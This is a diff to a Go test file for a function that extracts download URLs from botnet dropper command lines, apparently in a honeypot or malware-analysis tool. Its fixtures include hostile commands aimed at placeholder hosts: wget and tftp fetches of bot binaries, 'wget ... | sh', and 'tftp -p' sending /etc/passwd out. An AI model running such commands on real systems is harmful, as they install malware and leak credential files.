@@ -32,8 +32,9 @@ func TestPacer(t *testing.T) {
 	}
 }
 
-// urlRegex pulls the download URL out of typical bot lines and stops at shell separators and quotes.
-func TestURLRegex(t *testing.T) {
+// downloadURL pulls the download URL out of typical bot lines: one with a scheme (stopping at shell
+// separators and quotes), else what wget, tftp -g or ftpget would fetch without one.
+func TestDownloadURL(t *testing.T) {
 	tests := []struct {
 		line string
 		want string
@@ -46,9 +47,27 @@ func TestURLRegex(t *testing.T) {
 		{"ftpget -v -u anonymous ftp://example.com/x", "ftp://example.com/x"},
 		{"busybox tftp tftp://203.0.113.7/bot", "tftp://203.0.113.7/bot"},
 		{"cat /proc/cpuinfo", ""},
+
+		// without a scheme: BusyBox's wget takes it as http://
+		{"cd /tmp; wget 203.0.113.7/bins.sh; chmod 777 bins.sh", "http://203.0.113.7/bins.sh"},
+		{"wget -O /tmp/x -q 203.0.113.7:8080/y", "http://203.0.113.7:8080/y"},
+		{"/bin/busybox wget -qO- 'example.com/i.sh'|sh", "http://example.com/i.sh"},
+		{"nohup wget --user-agent Mozilla --tries=3 example.com/z &", "http://example.com/z"},
+		{"wget -U x -T 5 -t 2 -P /tmp -Y off example.com/a", "http://example.com/a"},
+		{"wget $IP/bins.sh", ""}, // only known when it runs
+		{"wget -q", ""},
+		{"wget HTTPS://example.com/a", ""}, // a scheme BusyBox refuses: nothing would be fetched
+		{"cd /tmp || cd /var/run; busybox tftp -g -r mips 203.0.113.7; chmod +x mips", "tftp://203.0.113.7/mips"},
+		{"tftp -l bot -r bins/arm7 -g 203.0.113.7 6969", "tftp://203.0.113.7:6969/bins/arm7"},
+		{"tftp -g -l bot 203.0.113.7", "tftp://203.0.113.7/bot"},
+		{"tftp -p -l /etc/passwd 203.0.113.7", ""}, // -p sends a file
+		{"ftpget -v -u anonymous -p anonymous -P 2121 203.0.113.7 bins.sh bins/arm7", "ftp://203.0.113.7:2121/bins/arm7"},
+		{"ftpget 203.0.113.7 x.sh", "ftp://203.0.113.7/x.sh"},
+		{"ftpget 203.0.113.7", ""},
+		{"echo wget; uname -a", ""},
 	}
 	for _, tt := range tests {
-		if got := urlRegex.FindString(tt.line); got != tt.want {
+		if got := downloadURL(tt.line); got != tt.want {
 			t.Errorf("%q: got %q, want %q", tt.line, got, tt.want)
 		}
 	}
